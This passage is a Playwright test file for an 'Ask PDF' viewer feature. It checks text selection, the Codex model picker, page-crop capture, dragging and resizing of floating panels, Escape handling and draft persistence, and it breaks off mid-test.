import { test, expect, type Locator, type Page } from '@playwright/test';

const PDF_URL = 'http://localhost:8979/pdf-viewer.html';
const ACCENT = { red: 77, green: 171, blue: 247 };

test('Ask PDF renders a stable Codex-quiet semantic conversation surface', async ({ page }) => {
  await openPdf(page);
  const answered = annotation({
    messages: [
      message('q-codex-quiet', 'user', 'Why does tiling matter?'),
      { ...message('a-codex-quiet', 'assistant', 'It reduces repeated **HBM traffic**.'), codexModel: 'gpt-5.4' },
    ],
    lastTurn: { status: 'idle', model: 'gpt-5.4' },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [answered],
    consentGranted: true,
    activeAnnotationId: answered.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel).toBeVisible();
  await expect(panel.getByRole('heading', { name: 'Ask about selection' })).toBeVisible();
  await expect(panel.locator('details[data-ask-source]')).not.toHaveAttribute('open', '');
  await expect(panel.getByText('YOU', { exact: true })).toHaveCount(0);
  await expect(panel.getByText('CODEX', { exact: true })).toHaveCount(0);
  await expect(panel.getByRole('button', { name: 'Send question' }).locator('svg')).toHaveCount(1);

  await expect.poll(() => messagesOfType(page, 'pdfDiscussionListModels')).toHaveLength(1);
  await postHost(page, {
    type: 'pdfDiscussionModels',
    models: [
      { id: 'default', model: 'gpt-5.4', displayName: 'GPT-5.4', description: 'Default model', isDefault: true },
      { id: 'fast', model: 'gpt-5.4-mini', displayName: 'GPT-5.4 Mini', description: 'Fast model', isDefault: false },
    ],
  });
  await expect(panel.getByRole('combobox', { name: 'Codex model' })).toHaveValue('gpt-5.4');

  const composer = panel.getByRole('textbox', { name: 'Ask about this selection' });
  await composer.focus();
  await composer.evaluate(element => { (window as any).__askComposerNode = element; });
  await postHost(page, { type: 'pdfDiscussionDelta', annotationId: answered.id, delta: 'Additional detail.' });
  await expect.poll(() => composer.evaluate(element => element === (window as any).__askComposerNode)).toBe(true);
  await expect(composer).toBeFocused();
});

test('Ask PDF submits the selected Codex model and locks the picker during the turn', async ({ page }) => {
  await openPdf(page);
  await askAbout(page, 'FlashAttention uses tiling');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: prepare.requestId,
    selectionKey: 'selection-model-picker',
  });
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [], consentGranted: true });
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionListModels')).toHaveLength(1);
  await postHost(page, {
    type: 'pdfDiscussionModels',
    models: [
      { id: 'default', model: 'gpt-5.4', displayName: 'GPT-5.4', description: 'Default model', isDefault: true },
      { id: 'fast', model: 'gpt-5.4-mini', displayName: 'GPT-5.4 Mini', description: 'Fast model', isDefault: false },
    ],
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const modelPicker = panel.getByRole('combobox', { name: 'Codex model' });
  await modelPicker.selectOption('gpt-5.4-mini');
  await panel.getByRole('textbox', { name: 'Ask about this selection' }).fill('Explain this with the fast model.');
  await panel.getByRole('button', { name: 'Send question' }).click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionSubmit')).toEqual([
    expect.objectContaining({
      question: 'Explain this with the fast model.',
      model: 'gpt-5.4-mini',
    }),
  ]);
  await expect(modelPicker).toBeDisabled();
  await expect(panel.getByRole('button', { name: 'Send question' })).toBeDisabled();
});

test('Ask PDF follows Look up, prepares without persisting, and captures an outlined bounded crop', async ({ page }) => {
  await openPdf(page);
  await selectText(page, 'FlashAttention uses tiling');
  await openSelectionContextMenu(page);

  const items = page.getByRole('menu').getByRole('menuitem');
  await expect(items.nth(0)).toHaveText('Look up ...');
  await expect(items.nth(1)).toHaveText('Ask about selection…');
  await page.getByRole('menuitem', { name: 'Ask about selection…', exact: true }).click();

  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  expect(prepare.selection).toMatchObject({ page: 1, snippet: 'FlashAttention uses tiling' });
  expect(prepare.selection.rects.length).toBeGreaterThan(0);
  expect(await messagesOfType(page, 'pdfDiscussionSubmit')).toHaveLength(0);
  expect(await page.evaluate(() => window.getSelection()?.isCollapsed)).toBe(true);

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel).toBeVisible();
  await expect(panel.getByRole('link', { name: 'Page 1' })).toBeVisible();
  await panel.getByRole('button', { name: 'Copy portable selection link' }).click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionCopyPortableLink')).toEqual([
    expect.objectContaining({
      selection: expect.objectContaining({ page: 1, snippet: 'FlashAttention uses tiling' }),
    }),
  ]);
  await expect(panel.locator('.ask-pdf-source-preview')).toHaveText('FlashAttention uses tiling');

  await panel.locator('details[data-ask-source] summary').click();
  const crop = panel.locator('img.ask-pdf-crop');
  await expect(crop).toBeVisible();
  const stats = await crop.evaluate(async (image: HTMLImageElement, accent) => {
    await image.decode();
    const canvas = document.createElement('canvas');
    canvas.width = image.naturalWidth;
    canvas.height = image.naturalHeight;
    const context = canvas.getContext('2d');
    context?.drawImage(image, 0, 0);
    const pixels = context?.getImageData(0, 0, canvas.width, canvas.height).data ?? [];
    let accentPixels = 0;
    let contentPixels = 0;
    for (let index = 0; index < pixels.length; index += 4) {
      const red = pixels[index] ?? 255;
      const green = pixels[index + 1] ?? 255;
      const blue = pixels[index + 2] ?? 255;
      if (Math.abs(red - accent.red) <= 8 && Math.abs(green - accent.green) <= 8 && Math.abs(blue - accent.blue) <= 8) {
        accentPixels++;
      }
      if (red < 242 || green < 242 || blue < 242) contentPixels++;
    }
    const base64 = image.src.split(',')[1] ?? '';
    const padding = base64.endsWith('==') ? 2 : base64.endsWith('=') ? 1 : 0;
    return {
      width: image.naturalWidth,
      height: image.naturalHeight,
      bytes: Math.floor(base64.length * 3 / 4) - padding,
      accentPixels,
      contentPixels,
    };
  }, ACCENT);
  expect(Math.max(stats.width, stats.height)).toBeLessThanOrEqual(1600);
  expect(stats.bytes).toBeLessThanOrEqual(5 * 1024 * 1024);
  expect(stats.accentPixels).toBeGreaterThan(0);
  expect(stats.contentPixels).toBeGreaterThan(stats.accentPixels);
});

test('PDF selection adds exact text and a best-effort crop to chat without submitting', async ({ page }) => {
  await page.setViewportSize({ width: 480, height: 720 });
  await openPdf(page);
  await selectText(page, 'FlashAttention uses tiling');

  const toolbar = page.locator('#selection-toolbar');
  const toolbarAction = toolbar.locator('button', { hasText: 'Add to Chat' });
  await expect(toolbarAction).toBeVisible();
  await expect(toolbarAction.locator('.add-to-chat-label')).toHaveText('Add to Chat');
  await expect(toolbarAction.locator('.add-to-chat-shortcut')).toHaveText(/^(?:⌘L|Ctrl\+L)$/);
  const toolbarLayout = await toolbar.evaluate((element) => {
    const rect = element.getBoundingClientRect();
    return {
      left: rect.left,
      top: rect.top,
      right: rect.right,
      bottom: rect.bottom,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
    };
  });
  const actionLayout = await toolbarAction.evaluate((element) => {
    const label = element.querySelector('.add-to-chat-label')?.getBoundingClientRect();
    const shortcut = element.querySelector('.add-to-chat-shortcut')?.getBoundingClientRect();
    const rect = element.getBoundingClientRect();
    return {
      childTags: Array.from(element.children, child => child.tagName),
      labelRight: label?.right ?? 0,
      shortcutLeft: shortcut?.left ?? 0,
      width: rect.width,
      height: rect.height,
    };
  });
  expect(actionLayout.childTags).toEqual(['SPAN', 'SPAN']);
  expect(actionLayout.shortcutLeft).toBeGreaterThanOrEqual(actionLayout.labelRight);
  expect(actionLayout.width).toBeLessThanOrEqual(140);
  expect(actionLayout.height).toBeLessThanOrEqual(36);
  expect(toolbarLayout.left).toBeGreaterThanOrEqual(7);
  expect(toolbarLayout.top).toBeGreaterThanOrEqual(7);
  expect(toolbarLayout.right).toBeLessThanOrEqual(toolbarLayout.viewportWidth - 7);
  expect(toolbarLayout.bottom).toBeLessThanOrEqual(toolbarLayout.viewportHeight - 7);
  await toolbarAction.click();

  const first = await lastMessage(page, 'selectionAction');
  expect(first).toMatchObject({
    action: 'addToCursorChat',
    anchor: {
      page: 1,
      snippet: 'FlashAttention uses tiling',
    },
  });
  expect(first.anchor.rects.length).toBeGreaterThan(0);
  expect(typeof first.snapshotPngBase64).toBe('string');
  expect(first.snapshotPngBase64.length).toBeGreaterThan(32);
  expect(
    await page.evaluate(base64 => Array.from(
      atob(base64).slice(0, 8),
      character => character.charCodeAt(0),
    ), first.snapshotPngBase64),
  ).toEqual([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  await page.waitForTimeout(50);
  expect(await messagesOfType(page, 'selectionAction')).toHaveLength(1);
  expect(await messagesOfType(page, 'pdfDiscussionSubmit')).toHaveLength(0);

  await selectText(page, 'FlashAttention uses tiling');
  await page.keyboard.press(process.platform === 'darwin' ? 'Meta+L' : 'Control+L');
  await expect.poll(() => messagesOfType(page, 'selectionAction')).toHaveLength(2);
  expect((await lastMessage(page, 'selectionAction')).action).toBe('addToCursorChat');
  expect(await messagesOfType(page, 'pdfDiscussionSubmit')).toHaveLength(0);

  await selectText(page, 'FlashAttention uses tiling');
  await openSelectionContextMenu(page);
  const menuAction = page.getByRole('menuitem', { name: /Add to Chat/ });
  await expect(menuAction).toBeVisible();
  await expect(menuAction).toContainText(/(?:⌘L|Ctrl\+L)/);
  await menuAction.click();
  await expect.poll(() => messagesOfType(page, 'selectionAction')).toHaveLength(3);
  expect((await lastMessage(page, 'selectionAction')).action).toBe('addToCursorChat');
  expect(await messagesOfType(page, 'pdfDiscussionSubmit')).toHaveLength(0);
});

test('PDF text drag takes focus from an external composer before the Cursor shortcut', async ({ page }) => {
  const quote = 'FlashAttention uses tiling';
  await openPdf(page);
  const endpoints = await page.locator('.pdf-text-glyphs').filter({ hasText: quote }).first()
    .evaluate((element, selectedText) => {
      const node = element.firstChild;
      const content = node?.textContent ?? '';
      const start = content.indexOf(selectedText);
      if (!node || node.nodeType !== Node.TEXT_NODE || start < 0) {
        throw new Error(`Missing fixture text: ${selectedText}`);
      }
      const pointAt = (offset: number, bias: number) => {
        const range = document.createRange();
        range.setStart(node, offset);
        range.setEnd(node, offset + 1);
        const rect = range.getBoundingClientRect();
        return {
          x: rect.left + rect.width * bias,
          y: rect.top + rect.height / 2,
        };
      };
      return {
        start: pointAt(start, 0.25),
        end: pointAt(start + selectedText.length - 1, 0.75),
      };
    }, quote);
  const externalComposer = page.locator('#external-agent-composer-fixture');
  await page.evaluate(() => {
    const composer = document.createElement('textarea');
    composer.id = 'external-agent-composer-fixture';
    composer.style.position = 'fixed';
    composer.style.left = '-10000px';
    document.body.appendChild(composer);
    composer.focus();
  });
  await expect(externalComposer).toBeFocused();

  await page.mouse.move(endpoints.start.x, endpoints.start.y);
  await page.mouse.down();
  await page.mouse.move(endpoints.end.x, endpoints.end.y, { steps: 12 });
  await page.mouse.up();

  await expect(page.locator('#selection-toolbar')).toBeVisible();
  await expect.poll(() => page.evaluate(() => document.activeElement?.id))
    .toBe('viewer-container');
  const selectedBeforeShortcut = await page.evaluate(() =>
    window.getSelection()?.toString().replace(/\s+/gu, ' ').trim()
  );
  expect(selectedBeforeShortcut).toBe(quote);

  await page.evaluate(() => { window.__mockMessages = []; });
  await page.keyboard.press(process.platform === 'darwin' ? 'Meta+L' : 'Control+L');
  await expect.poll(() => messagesOfType(page, 'selectionAction')).toHaveLength(1);
  await page.waitForTimeout(50);
  const actions = await messagesOfType(page, 'selectionAction');
  expect(actions).toHaveLength(1);
  expect(actions[0]).toMatchObject({
    action: 'addToCursorChat',
    anchor: { page: 1, snippet: quote },
  });
  expect(actions[0].snapshotPngBase64).toEqual(expect.any(String));
  expect(actions[0].snapshotPngBase64.length).toBeGreaterThan(32);
  expect(await page.evaluate(() =>
    window.getSelection()?.toString().replace(/\s+/gu, ' ').trim()
  )).toBe(selectedBeforeShortcut);
});

test('Ask PDF opens as an anchored floating inspector inside the PDF viewport', async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 820 });
  await openPdf(page);
  await selectText(page, 'FlashAttention uses tiling');
  const selectionBox = await selectedRangeBox(page);
  await openSelectionContextMenu(page);
  await page.getByRole('menuitem', { name: 'Ask about selection…', exact: true }).click();

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel).toBeVisible();
  await expect(panel).toHaveCSS('position', 'absolute');
  await expect(panel).toHaveClass(/attached/);

  const panelBox = await requiredBox(panel);
  const shellBox = await requiredBox(page.locator('#viewer-shell'));
  const toolbarBox = await requiredBox(page.locator('#toolbar'));
  expect(panelBox.x).toBeGreaterThanOrEqual(shellBox.x + 11);
  expect(panelBox.y).toBeGreaterThanOrEqual(shellBox.y + 11);
  expect(panelBox.x + panelBox.width).toBeLessThanOrEqual(shellBox.x + shellBox.width - 11);
  expect(panelBox.y + panelBox.height).toBeLessThanOrEqual(shellBox.y + shellBox.height - 11);
  expect(overlapArea(panelBox, selectionBox)).toBe(0);
  expect(overlapArea(panelBox, toolbarBox)).toBe(0);

  await page.locator('#viewer-container').evaluate((container: HTMLElement) => {
    // The default one-page fixture is auto-fit and has no natural overflow.
    // Add document-space below it so this remains a deterministic assertion
    // that an attached inspector follows its anchor during a real scroll.
    document.querySelector<HTMLElement>('#page-container')!.style.paddingBottom = '180px';
    container.scrollTop += 72;
    container.dispatchEvent(new Event('scroll'));
  });
  await expect.poll(() => page.locator('#viewer-container').evaluate(
    (container: HTMLElement) => container.scrollTop,
  )).toBeGreaterThan(0);
  await expect.poll(async () => Math.round((await requiredBox(panel)).y)).not.toBe(Math.round(panelBox.y));
  await expect(panel).toHaveClass(/attached/);
});

test('Ask PDF migrates moved draft geometry and restores the durable inspector after minimize', async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 820 });
  await openPdf(page);
  await askAbout(page, 'FlashAttention uses tiling');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: prepare.requestId,
    selectionKey: 'selection-floating-draft',
  });
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [], consentGranted: true });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const composer = panel.getByPlaceholder('Ask about this selection');
  await composer.fill('Draft owned by the floating inspector');
  await dragBy(page, panel.locator('.ask-pdf-header'), 84, 68);
  const moved = await requiredBox(panel);
  await resizeBy(page, panel.locator('.ask-pdf-resize-handle[data-direction="se"]'), 52, 44);
  const resized = await requiredBox(panel);
  expect(resized.width).toBeGreaterThan(moved.width + 45);
  expect(resized.height).toBeGreaterThan(moved.height + 37);

  const durable = annotation({
    id: 'discussion-floating-draft',
    selectionKey: 'selection-floating-draft',
    messages: [message('durable-question', 'user', 'Durable question transcript')],
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [durable],
    consentGranted: true,
    activeAnnotationId: durable.id,
  });

  await expect(panel).toContainText('Durable question transcript');
  await expect(composer).toHaveValue('Draft owned by the floating inspector');
  expectBoxNear(await requiredBox(panel), resized);
  const migratedState = await page.evaluate(id => (window as any).__mockState.askPdfWindows?.[id], durable.id);
  expect(migratedState).toMatchObject({
    left: expect.any(Number),
    top: expect.any(Number),
    width: Math.round(resized.width),
    height: Math.round(resized.height),
    detached: true,
    minimized: false,
  });

  await panel.getByRole('button', { name: 'Minimize Ask PDF' }).click();
  await expect(panel).toBeHidden();
  expect(await page.evaluate(id => (window as any).__mockState.askPdfWindows[id].minimized, durable.id)).toBe(true);
  await page.locator(`.pdf-discussion-marker[data-annotation-id="${durable.id}"]`).click();
  await expect(panel).toBeVisible();
  await expect(panel).toContainText('Durable question transcript');
  await expect(composer).toHaveValue('Draft owned by the floating inspector');
  expectBoxNear(await requiredBox(panel), resized);
  expect(await page.evaluate(id => (window as any).__mockState.askPdfWindows[id].minimized, durable.id)).toBe(false);
});

test('Ask PDF markers and overview restore annotation-owned geometry drafts and minimized state', async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 820 });
  await openPdf(page);
  const first = annotation({
    id: 'discussion-owned-a',
    selectionKey: 'selection-owned-a',
    updatedAt: '2026-07-15T12:10:00.000Z',
    messages: [message('question-a', 'user', 'Question A transcript')],
    anchor: { ...baseAnchor(), rects: [[72, 90, 230, 112]] },
  });
  const second = annotation({
    id: 'discussion-owned-b',
    selectionKey: 'selection-owned-b',
    updatedAt: '2026-07-15T12:00:00.000Z',
    messages: [message('question-b', 'user', 'Question B transcript')],
    anchor: { ...baseAnchor(), rects: [[72, 150, 230, 172]] },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [first, second],
    consentGranted: true,
    activeAnnotationId: first.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const composer = panel.getByPlaceholder('Ask about this selection');
  await expect(panel).toContainText('Question A transcript');
  await composer.fill('Draft A');
  await dragBy(page, panel.locator('.ask-pdf-header'), 96, 84);
  const firstBox = await requiredBox(panel);
  await panel.getByRole('button', { name: 'Minimize Ask PDF' }).click();
  await expect(panel).toBeHidden();

  await page.getByRole('button', { name: 'PDF discussions (2)' }).click();
  const overview = page.getByRole('region', { name: 'PDF discussion overview' });
  await expect(overview).toBeVisible();
  await overview.getByRole('button', { name: /Question B transcript/ }).click();
  await expect(panel).toContainText('Question B transcript');
  await expect(composer).toHaveValue('');
  await composer.fill('Draft B');
  await dragBy(page, panel.locator('.ask-pdf-header'), -128, 132);
  await resizeBy(page, panel.locator('.ask-pdf-resize-handle[data-direction="se"]'), 40, -58);
  const secondBox = await requiredBox(panel);
  await panel.getByRole('button', { name: 'Minimize Ask PDF' }).click();

  const ownedState = await page.evaluate(() => (window as any).__mockState.askPdfWindows);
  expect(ownedState[first.id]).toMatchObject({ minimized: true, detached: true });
  expect(ownedState[second.id]).toMatchObject({ minimized: true, detached: true });
  expect(ownedState[first.id]).not.toMatchObject({
    left: ownedState[second.id].left,
    top: ownedState[second.id].top,
    width: ownedState[second.id].width,
    height: ownedState[second.id].height,
  });

  await page.locator(`.pdf-discussion-marker[data-annotation-id="${first.id}"]`).click();
  await expect(panel).toContainText('Question A transcript');
  await expect(composer).toHaveValue('Draft A');
  expectBoxNear(await requiredBox(panel), firstBox);

  await page.getByRole('button', { name: 'PDF discussions (2)' }).click();
  await page.getByRole('region', { name: 'PDF discussion overview' })
    .getByRole('button', { name: /Question B transcript/ })
    .click();
  await expect(panel).toContainText('Question B transcript');
  await expect(composer).toHaveValue('Draft B');
  expectBoxNear(await requiredBox(panel), secondBox);
});

test('Ask PDF keyboard resizing stays accessible while narrow mode disables pointer geometry changes', async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 820 });
  await openPdf(page);
  const cited = annotation();
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [cited],
    consentGranted: true,
    activeAnnotationId: cited.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const separator = panel.locator('.ask-pdf-resizer');
  await expect(separator).toHaveAttribute('aria-valuemin', '320');
  await expect(separator).toHaveAttribute('aria-valuemax', '560');
  const beforeKeyboard = await requiredBox(panel);
  await separator.focus();
  await separator.press('ArrowRight');
  await separator.press('ArrowDown');
  const afterKeyboard = await requiredBox(panel);
  expect(afterKeyboard.width).toBeGreaterThanOrEqual(beforeKeyboard.width + 15);
  expect(afterKeyboard.height).toBeGreaterThanOrEqual(beforeKeyboard.height + 15);
  await expect(separator).toHaveAttribute('aria-valuenow', String(Math.round(afterKeyboard.width)));
  await expect(separator).toHaveAttribute(
    'aria-valuetext',
    `${Math.round(afterKeyboard.width)} by ${Math.round(afterKeyboard.height)} pixels`,
  );

  await page.setViewportSize({ width: 600, height: 820 });
  await expect.poll(() => panel.evaluate(element => {
    const panelRect = element.getBoundingClientRect();
    const shellRect = document.querySelector('#viewer-shell')!.getBoundingClientRect();
    return {
      left: Math.round(panelRect.left - shellRect.left),
      top: Math.round(panelRect.top - shellRect.top),
      right: Math.round(shellRect.right - panelRect.right),
      bottom: Math.round(shellRect.bottom - panelRect.bottom),
    };
  })).toEqual({ left: 0, top: 0, right: 0, bottom: expect.any(Number) });

  const narrow = await requiredBox(panel);
  await dragBy(page, panel.locator('.ask-pdf-header'), 72, 68);
  expect(await panel.locator('.ask-pdf-resize-handle:not(.ask-pdf-resizer)').evaluateAll(elements =>
    elements.every(element => getComputedStyle(element).display === 'none'),
  )).toBe(true);
  expectBoxNear(await requiredBox(panel), narrow);
});

test('Ask PDF exposes only reachable resize values below its nominal minimum width', async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 820 });
  await openPdf(page);
  const cited = annotation({ id: 'discussion-narrow-aria', selectionKey: 'selection-narrow-aria' });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [cited],
    consentGranted: true,
    activeAnnotationId: cited.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const separator = panel.locator('.ask-pdf-resizer');
  await expect(separator).toHaveAttribute('aria-valuemin', '320');
  await expect(separator).toHaveAttribute('aria-valuemax', '560');

  await page.setViewportSize({ width: 330, height: 820 });
  await expect.poll(async () => Math.round((await requiredBox(panel)).width)).toBe(330);
  const narrowWidth = Math.round((await requiredBox(panel)).width);
  await expect(separator).toHaveAttribute('aria-valuemin', String(narrowWidth));
  await expect(separator).toHaveAttribute('aria-valuemax', String(narrowWidth));
  await expect(separator).toHaveAttribute('aria-valuenow', String(narrowWidth));

  await separator.focus();
  await separator.press('ArrowRight');
  expect(Math.round((await requiredBox(panel)).width)).toBe(narrowWidth);
  await expect(separator).toHaveAttribute('aria-valuemin', String(narrowWidth));
  await expect(separator).toHaveAttribute('aria-valuemax', String(narrowWidth));
  await expect(separator).toHaveAttribute('aria-valuenow', String(narrowWidth));
});

test('Ask PDF minimizes the active annotation when Escape originates in the PDF', async ({ page }) => {
  await openPdf(page);
  const first = annotation({
    id: 'discussion-escape-a',
    selectionKey: 'selection-escape-a',
    anchor: { ...baseAnchor(), rects: [[72, 90, 230, 112]] },
  });
  const second = annotation({
    id: 'discussion-escape-b',
    selectionKey: 'selection-escape-b',
    anchor: { ...baseAnchor(), rects: [[72, 150, 230, 172]] },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [first, second],
    consentGranted: true,
    activeAnnotationId: first.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await page.locator(`.pdf-discussion-marker[data-annotation-id="${second.id}"]`).click();
  await page.locator(`.pdf-discussion-marker[data-annotation-id="${first.id}"]`).click();
  await page.keyboard.press('Control+F');
  await expect(page.locator('#pdf-search')).toBeVisible();
  await page.locator('#viewer-shell').focus();
  await page.locator('#viewer-shell').press('Escape');
  await expect(page.locator('#pdf-search')).toBeHidden();
  await expect(panel).toBeVisible();

  await page.locator('#viewer-shell').focus();
  await page.locator('#viewer-shell').press('Escape');

  await expect(panel).toBeHidden();
  const windows = await page.evaluate(() => (window as any).__mockState.askPdfWindows);
  expect(windows[first.id].minimized).toBe(true);
  expect(windows[second.id].minimized).toBe(false);

  await page.getByRole('button', { name: 'PDF discussions (2)' }).click();
  await expect(panel).toBeVisible();
  await expect(page.getByRole('region', { name: 'PDF discussion overview' })).toBeVisible();
  await page.locator('#viewer-shell').focus();
  await page.locator('#viewer-shell').press('Escape');
  await expect(page.getByRole('region', { name: 'PDF discussion overview' })).toBeVisible();
});

test('Ask PDF yields panel-origin Escape to an active PDF tool before minimizing', async ({ page }) => {
  await openPdf(page);
  const cited = annotation({ id: 'discussion-panel-escape', selectionKey: 'selection-panel-escape' });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [cited],
    consentGranted: true,
    activeAnnotationId: cited.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const composer = panel.getByPlaceholder('Ask about this selection');
  await page.keyboard.press('Control+F');
  await expect(page.locator('#pdf-search')).toBeVisible();
  await composer.focus();
  await composer.press('Escape');

  await expect(page.locator('#pdf-search')).toBeHidden();
  await expect(panel).toBeVisible();
  expect(await page.evaluate(id => (window as any).__mockState.askPdfWindows[id].minimized, cited.id)).toBe(false);

  await composer.focus();
  await composer.press('Escape');
  await expect(panel).toBeHidden();
  expect(await page.evaluate(id => (window as any).__mockState.askPdfWindows[id].minimized, cited.id)).toBe(true);
});

test('Ask PDF rejects a cross-page native selection with a precise text-only error', async ({ page }) => {
  await openPdf(page, 'two-page');
  await page.evaluate(() => {
    const spans = document.querySelectorAll<HTMLElement>('.text-layer span[data-item-index]');
    const first = spans[0];
    const second = spans[1];
    const firstText = first?.querySelector('.pdf-text-glyphs')?.firstChild;
    const secondText = second?.querySelector('.pdf-text-glyphs')?.firstChild;
    if (!firstText || !secondText) throw new Error('Expected two rendered text spans');
    const range = document.createRange();
    range.setStart(firstText, 0);
    range.setEnd(secondText, second?.textContent?.length ?? 0);
    const selection = window.getSelection();
    selection?.removeAllRanges();
    selection?.addRange(range);
    window.postMessage({ type: 'pdfDiscussionOpenForSelection' }, '*');
  });

  await expect(page.getByRole('complementary', { name: 'Ask about selection' })).toContainText('Select text on one page');
  expect(await messagesOfType(page, 'pdfDiscussionPrepare')).toHaveLength(0);
});

test('Ask PDF separates the exact selected passage from explicitly labelled nearby context', async ({ page }) => {
  await openPdf(page);
  const cited = annotation();
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [cited],
    consentGranted: true,
    activeAnnotationId: cited.id,
  });

  const source = page.getByRole('complementary', { name: 'Ask about selection' }).locator('.ask-pdf-source');
  const disclosure = source.locator('details.ask-pdf-context');
  await expect(disclosure).not.toHaveAttribute('open', '');
  await expect(disclosure.locator('summary > span').first()).toHaveText('Selected passage');
  await expect(disclosure.locator('.ask-pdf-source-preview')).toHaveText(cited.anchor.quote);
  await disclosure.locator('summary').click();
  await expect(disclosure.locator('blockquote')).toHaveText(cited.anchor.quote);

  const nearby = source.getByRole('region', { name: 'Nearby context' });
  await expect(nearby.locator('dt')).toHaveText(['Before', 'After']);
  await expect(nearby.locator('dd')).toHaveText([cited.anchor.prefix, cited.anchor.suffix]);
});

test('Ask PDF omits nearby context when the anchor has no prefix or suffix', async ({ page }) => {
  await openPdf(page);
  const anchorWithoutContext = baseAnchor();
  Reflect.deleteProperty(anchorWithoutContext, 'prefix');
  Reflect.deleteProperty(anchorWithoutContext, 'suffix');
  const cited = annotation({ anchor: anchorWithoutContext });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [cited],
    consentGranted: true,
    activeAnnotationId: cited.id,
  });

  const source = page.getByRole('complementary', { name: 'Ask about selection' }).locator('.ask-pdf-source');
  await expect(source.locator('summary > span').first()).toHaveText('Selected passage');
  await source.locator('summary').click();
  await expect(source.locator('blockquote')).toHaveText(cited.anchor.quote);
  await expect(source.getByRole('region', { name: 'Nearby context' })).toHaveCount(0);
});

test('Ask PDF submits text-only context when page-crop capture fails', async ({ page }) => {
  await openPdf(page);
  await page.evaluate(() => {
    HTMLCanvasElement.prototype.toDataURL = () => {
      throw new DOMException('Canvas export unavailable');
    };
  });
  await askAbout(page, 'FlashAttention uses tiling');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: prepare.requestId,
    selectionKey: 'selection-text-only',
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel.locator('img.ask-pdf-crop')).toHaveCount(0);
  await expect(panel).toContainText('The page crop is unavailable, so Ask PDF will use text-only context.');
  await panel.getByRole('button', { name: 'Accept and continue' }).click();
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [], consentGranted: true });
  await panel.getByPlaceholder('Ask about this selection').fill('Explain this without the crop.');
  await panel.getByPlaceholder('Ask about this selection').press('Control+Enter');

  const submit = await lastMessage(page, 'pdfDiscussionSubmit');
  expect(submit.question).toBe('Explain this without the crop.');
  expect(submit.selection).toMatchObject({ page: 1, snippet: 'FlashAttention uses tiling' });
  expect(submit).not.toHaveProperty('snapshotPngBase64');
});

test('Ask PDF preserves the exact draft until persistence is acknowledged and blocks duplicate submits', async ({ page }) => {
  await openPdf(page);
  await askAbout(page, 'FlashAttention uses tiling');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: prepare.requestId,
    selectionKey: 'selection-pending-draft',
  });
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [], consentGranted: true });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const composer = panel.getByPlaceholder('Ask about this selection');
  const exactDraft = '  Explain this passage after the crop is saved.  ';
  await composer.fill(exactDraft);
  await composer.press('Control+Enter');
  const firstSubmit = await lastMessage(page, 'pdfDiscussionSubmit');
  expect(firstSubmit.question).toBe(exactDraft.trim());

  await expect(composer).toHaveValue(exactDraft);
  await expect(composer).toBeDisabled();
  expect(await page.evaluate(() => window.__mockState.askPdfDraft)).toBe(exactDraft);
  await composer.dispatchEvent('keydown', { key: 'Enter', ctrlKey: true });
  expect(await messagesOfType(page, 'pdfDiscussionSubmit')).toHaveLength(1);

  await postHost(page, {
    type: 'pdfDiscussionError',
    requestId: firstSubmit.requestId,
    message: 'The PDF discussion could not be saved.',
  });
  await expect(panel).toContainText('The PDF discussion could not be saved.');
  await expect(composer).toHaveValue(exactDraft);
  await expect(composer).toBeEnabled();
  expect(await page.evaluate(() => window.__mockState.askPdfDraft)).toBe(exactDraft);

  await panel.getByRole('button', { name: 'Send question' }).click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionSubmit')).toHaveLength(2);
  const persisted = annotation({
    selectionKey: 'selection-pending-draft',
    messages: [message('persisted-question', 'user', exactDraft.trim())],
    lastTurn: { status: 'running' },
  });
  await postHost(page, {
